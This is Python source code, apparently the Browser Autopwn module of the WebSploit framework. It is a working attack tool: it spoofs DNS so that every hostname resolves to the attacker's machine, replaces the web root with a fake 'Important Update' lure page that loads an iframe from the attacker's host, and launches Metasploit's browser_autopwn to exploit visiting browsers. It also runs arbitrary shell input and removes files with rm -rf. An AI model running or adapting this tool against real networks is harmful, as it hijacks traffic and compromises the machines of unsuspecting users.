#!/usr/bin/env python
#
# WebSploit Framework Browser Autopwn module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from time import sleep
from core import wcolors
from core import help
options =["eth0", "192.168.1.1"]
def brow_autopwn():
	try:
		line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line_1 += ":"
		line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "Browser_Autopwn" + wcolors.color.ENDC
		line_1 += " > "
		com = raw_input(line_1)
		com = com.lower()
		if com[0:9] =='set lhost':
			options[1] = com[10:25]
			print "INTERFACE => ", options[1]
			brow_autopwn()
		elif com[0:13] =='set interface':
			options[0] = com[14:19]
			print "LHOST => ", options[0]
			brow_autopwn()
		elif com[0:12] =='show options':
			print ""
			print "Options\t\t Value\t\t\t RQ\t Description"
			print "---------\t--------------\t\t----\t--------------"
			print "Interface\t"+options[0]+"\t\t\tyes\tNetwork Interface Name"
			print "LHOST\t\t"+options[1]+"\t\tyes\tLocal IP Address"
			print ""
			brow_autopwn()
		elif com[0:2] =='os':
			os.system(com[3:])
			brow_autopwn()
		elif com[0:4] =='help':
			help.help()
			brow_autopwn()
		elif com[0:4] =='back':
			pass
		elif com[0:3] =='run':
			print(wcolors.color.YELLOW + "[*]Starting WebServer ... Please Wait ..." + wcolors.color.ENDC)
			sleep(2)
			subprocess.Popen('/etc/init.d/apache2 start', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			print(wcolors.color.YELLOW + "[*]Configuration DNS Spoof ... " + wcolors.color.ENDC)
			sleep(2)
			os.chdir('//tmp')
			check_tmp = os.listdir(os.curdir)
			if 'fillter.dns' in check_tmp:
				os.system('rm -rf fillter.dns')
			myfile = open('fillter.dns', 'w')
			myfile.write(options[1] + ' *')
			myfile.close()
			print(wcolors.color.YELLOW + "[*]Creating Infected Page For Victim ..." + wcolors.color.ENDC)
			sleep(3)
			os.chdir('//var//www')
			check_var = os.listdir(os.curdir)
			if 'index.html' in check_var:
				os.system('rm -rf index.html')
			myfile2 = open('index.html', 'w')
			myfile2.write('<html>\n')
			myfile2.write('<title>Important Update</title>\n')
			myfile2.write('<body>\n')
			myfile2.write('<center><h2>Important Update ... </h2></center>\n')
			myfile2.write('<center><h3>Don\'t Close The Browser<h3></center>\n')
			myfile2.write('<h3><center>Wait a Few Seconds ...</center></h3>\n')
			myfile2.write('<center><iframe src=http://' + options[1] + ':8080/index></iframe></center>\n')
			myfile2.write('</body>\n')
			myfile2.write('</html>\n')
			myfile2.close()
			print(wcolors.color.YELLOW + "[*]Engine Has Been Started." + wcolors.color.ENDC)
			sleep(2)
			os.chdir('//tmp')
			command_1 = 'dnsspoof -i ' + options[0] + ' -f fillter.dns'
			subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			sleep(2)
			os.system('msfcli server/browser_autopwn LHOST='+ options[1] + ' URIPATH=index E')
		else:
			print "Wrong Command => ", com
			brow_autopwn()
	except(KeyboardInterrupt):
		print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, System Exit" + wcolors.color.ENDC)

